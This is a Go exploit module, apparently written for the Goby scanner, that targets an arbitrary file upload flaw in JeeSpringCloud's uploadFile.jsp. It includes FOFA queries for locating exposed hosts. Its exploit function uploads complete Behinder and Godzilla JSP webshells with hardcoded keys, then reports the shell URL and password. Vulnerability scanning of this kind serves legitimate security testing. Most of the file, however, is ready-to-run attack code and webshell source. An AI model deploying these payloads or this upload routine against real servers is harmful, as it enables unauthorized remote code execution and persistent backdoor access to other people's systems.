package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "JeeSpringCloud uploadFile.jsp file upload vulnerability",
    "Description": "<p>JeeSpringCloud is a free and open source Java Internet cloud rapid development platform.</p><p>JeeSpringCloud can upload any file by accessing /static/uploadify/uploadFile.jsp and specify the file upload path through the ?uploadPath parameter, causing the server to be controlled.</p>",
    "Product": "JeeSpringCloud",
    "Homepage": "https://gitee.com/JeeHuangBingGui/jeeSpringCloud",
    "DisclosureDate": "2023-03-17",
    "Author": "715827922@qq.com",
    "FofaQuery": "body=\"/jeeSpringStatic/plugs/jquery/jquery\" || header=\"com.jeespring.session.id\" || header=\"com.jeespring.session.id\"",
    "GobyQuery": "body=\"/jeeSpringStatic/plugs/jquery/jquery\" || header=\"com.jeespring.session.id\" || header=\"com.jeespring.session.id\"",
    "Level": "3",
    "Impact": "<p>An attacker can use this vulnerability to write a backdoor on the server side, execute code, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to project updates: <a href=\"https://gitee.com/JeeHuangBingGui/jeeSpringCloud\">https://gitee.com/JeeHuangBingGui/jeeSpringCloud</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\"); %>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "JeeSpringCloud uploadFile.jsp 文件上传漏洞",
            "Product": "JeeSpringCloud",
            "Description": "<p>JeeSpringCloud 是一款免费开源的 Java 互联网云快速开发平台。</p><p>JeeSpringCloud 访问 /static/uploadify/uploadFile.jsp 可上传任意文件，并可通过 uploadPath 参数指定文件上传路径，导致服务器被控制。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注项目更新：<a href=\"https://gitee.com/JeeHuangBingGui/jeeSpringCloud\">https://gitee.com/JeeHuangBingGui/jeeSpringCloud</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端写入后门，执行代码，获取服务器权限，进而控制整个 web 服务器。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "JeeSpringCloud uploadFile.jsp file upload vulnerability",
            "Product": "JeeSpringCloud",
            "Description": "<p>JeeSpringCloud is a free and open source Java Internet cloud rapid development platform.</p><p>JeeSpringCloud can upload any file by accessing /static/uploadify/uploadFile.jsp and specify the file upload path through the ?uploadPath parameter, causing the server to be controlled.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to project updates: <a href=\"https://gitee.com/JeeHuangBingGui/jeeSpringCloud\">https://gitee.com/JeeHuangBingGui/jeeSpringCloud</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>An attacker can use this vulnerability to write a backdoor on the server side, execute code, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-10-10",
    "PocId": "10847"
}`

	sendPayloadcb810cfa := func(hostInfo *httpclient.FixUrl, content string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewPostRequestConfig("/static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		boundary := goutils.RandomHexString(32)
		cfg.Header.Store("Content-Type", "multipart/form-data; boundary="+boundary)
		cfg.Data = strings.ReplaceAll(`--`+boundary+`
Content-Disposition: form-data; name="fileshare"; filename="xxx.jsp"
Content-Type: image/jpeg

`+content+`
--`+boundary+`--`, "\n", "\r\n")
		rsp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil || rsp.StatusCode != 200 || !strings.Contains(rsp.Utf8Html, "jsp") {
			return nil, err
		}
		filename := rsp.Utf8Html[:strings.Index(rsp.Utf8Html, "jsp")] + "jsp"
		cfgCheck := httpclient.NewGetRequestConfig("/static/uploadify/" + filename)
		cfgCheck.VerifyTls = false
		cfgCheck.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, cfgCheck)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			rsp, _ := sendPayloadcb810cfa(u, "<% out.println(\""+checkStr+"\");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>")
			return rsp != nil && rsp.StatusCode == 200 && strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "out.println")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			webshell := goutils.B2S(ss.Params["webshell"])
			var content string
			if attackType == "webshell" {
				if webshell == "behinder" {
					// 该密钥为连接密码 32 位 md5 值的前 16 位，默认连接密码 rebeyond
					content = `<%@page import="java.util.*,java.io.*,javax.crypto.*,javax.crypto.spec.*" %><%! class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64 = Class.forName("java.util.Base64"); Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null); value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});} catch (Exception e) {try { base64 = Class.forName("sun.misc.BASE64Decoder");  Object decoder = base64.newInstance();  value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs}); } catch (Exception e2) {}}return value;}%><% if(request.getMethod().equals("POST")){String k = "e45e329feb5d925b";session.putValue("u", k);Cipher c = Cipher.getInstance("AES");c.init(2, new SecretKeySpec(k.getBytes(), "AES"));StringBuilder sb = new StringBuilder();InputStream inputStream = request.getInputStream();BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));String line;while ((line = reader.readLine()) != null) {sb.append(line);}String data = sb.toString();byte[] bytes = c.doFinal(base64Decode(data));new U(this.getClass().getClassLoader()).g(bytes).newInstance().equals(pageContext);} %>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc = "3c6e0b8a9c15224a";
    String pass = "pass";
    String md5 = md5(pass + xc);
    static Class payloadClass;

    class X extends ClassLoader {
        public X(ClassLoader z) {
            super(z);
        }

        public Class Q(byte[] cb) {
            return super.defineClass(cb, 0, cb.length);
        }
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }%><%
    try {
        byte[] data = base64Decode(request.getParameter(pass));
        data = x(data, false);
        if (payloadClass == null) {
            payloadClass = new X(this.getClass().getClassLoader()).Q(data);
        } else {
            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
            Object f = payloadClass.newInstance();
            f.equals(arrOut);
            f.equals(pageContext);
            f.equals(data);
            response.getWriter().write(md5.substring(0, 16));
            f.toString();
            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
            response.getWriter().write(md5.substring(16));
        }
    } catch (Exception e) {
    }
%>`
				}
			} else if attackType == "custom" {
				content = goutils.B2S(ss.Params["content"])
			} else {
				expResult.Output = `未知的利用方式`
				return expResult
			}
			rsp, err := sendPayloadcb810cfa(expResult.HostInfo, content)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			} else if rsp.StatusCode != 200 && rsp.StatusCode != 500 {
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Output += "WebShell URL: " + expResult.HostInfo.FixedHostInfo + rsp.Request.URL.Path + "\n"
			if webshell == "behinder" {
				expResult.Output += "Password: rebeyond\n"
				expResult.Output += "WebShell tool: Behinder v3.0\n"
			} else if webshell == "godzilla" {
				expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
				expResult.Output += "WebShell tool: Godzilla v4.1\n"
			}
			expResult.Output += "Webshell type: jsp"
			expResult.Success = true
			return expResult
		},
	))
}
